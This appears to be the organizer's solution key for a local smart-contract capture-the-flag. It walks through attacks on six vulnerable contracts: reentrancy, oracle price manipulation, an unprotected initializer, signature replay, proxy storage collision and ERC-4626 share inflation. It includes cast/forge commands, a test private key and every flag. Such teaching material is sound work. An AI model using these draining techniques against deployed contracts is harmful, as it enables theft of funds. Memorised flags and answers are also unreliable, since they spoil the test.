# Reentrant — full solution (ORGANIZER)

All six are solved on-chain against `http://localhost:8545` as the attacker
(anvil account[1]). The reference exploits are Foundry scripts in
[../contracts/script/solve/](../contracts/script/solve/); `make check` runs them
all and then asks the dispenser for each flag (it verifies `isSolved()` on-chain).

Run one by hand like this (the attacker key and the Setup address):

```bash
export RPC=http://localhost:8545
export PK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
SETUP=<addr> forge script script/solve/SolveC1.s.sol:SolveC1 \
  --rpc-url $RPC --private-key $PK --broadcast
```

Setup addresses are on the scoreboard (`GET /` or `GET /challenges`).

---

## 1 — The Vault (reentrancy)
Deploy an attacker contract whose `receive()` re-enters `withdraw()` while the
vault still holds ETH. Deposit 1 ETH, call `withdraw()` once; the callback drains
the pooled deposits. → `address(vault).balance == 0`.
See [SolveC1.s.sol](../contracts/script/solve/SolveC1.s.sol). Flag
`RKT{r33ntr4ncy_c31_v10l4t10n_dr41n_th3_v4ult}`.

## 2 — The Oracle (spot-price manipulation)
You're seeded with 1000 tokens; the AMM holds only 10 ETH / 10 tokens.

1. `token.approve(amm, max)`
2. `amm.sellToken(1000e18)` — dumps tokens, crashing the spot price to ~dust.
3. `pool.borrow{value: price*100*2/1e18 + 1}(100e18)` — the collateral is now
   negligible, so you walk off with all 100 pool tokens.

→ `token.balanceOf(pool) == 0`. See
[SolveC2.s.sol](../contracts/script/solve/SolveC2.s.sol). Flag
`RKT{sp0t_pr1c3_0r4cl3_fl4shl04n_m4n1pul4t10n}`.

## 3 — The Admin (unprotected initializer)
```bash
cast send <TREASURY> "initialize(address)" <YOU> --rpc-url $RPC --private-key $PK
cast send <TREASURY> "sweep(address)"      <YOU> --rpc-url $RPC --private-key $PK
```
(`<TREASURY>` = `cast call <SETUP> "treasury()(address)"`.) → treasury drained.
Flag `RKT{unpr0t3ct3d_1n1t_m1ss1ng_4cc3ss_c0ntr0l}`.

## 4 — The Permit (signature replay)
Read the one published voucher off the Setup (`voucherTo()`, `voucherAmount()`,
`sigV()/sigR()/sigS()`) and replay `claim()` `balance/amount` (= 10) times. No
nonce, no used-marker → it pays every time. → pot drained. See
[SolveC4.s.sol](../contracts/script/solve/SolveC4.s.sol). Flag
`RKT{s1gn4tur3_r3pl4y_n0_n0nc3_n0_d34dl1n3}`.

## 5 — The Upgrade (storage collision)
Call `nominate(you)` **through the proxy address** — the proxy has no such
function, so it `delegatecall`s the logic, whose slot-1 write (`nominee`) lands
on the proxy's slot 1 (`owner`). Then `sweep(you)`.
```bash
cast send <PROXY> "nominate(address)" <YOU> --rpc-url $RPC --private-key $PK
cast send <PROXY> "sweep(address)"    <YOU> --rpc-url $RPC --private-key $PK
```
→ proxy drained. Flag `RKT{pr0xy_st0r4g3_c0ll1s10n_d3l3g4t3c4ll_pwn}`.

## 6 — The Shares (ERC-4626 inflation)
1. `asset.approve(vault, max)`
2. `vault.deposit(1)` — 1 wei → 1 share (supply was 0)
3. `asset.transfer(vault, 10000e18)` — donate, inflating the share price
4. `setup.victimDeposit()` — the victim's 10000e18 rounds to **0 shares**
5. `vault.redeem(1)` — your single share redeems the whole pool

→ victim has 0 shares and 0 assets, vault empty. See
[SolveC6.s.sol](../contracts/script/solve/SolveC6.s.sol). Flag
`RKT{3rc4626_f1rst_d3p0s1t0r_sh4r3_1nfl4t10n}`.

---

## One-shot

```bash
make up && make check     # -> ALL 6 FLAGS CAPTURED, exit 0
```
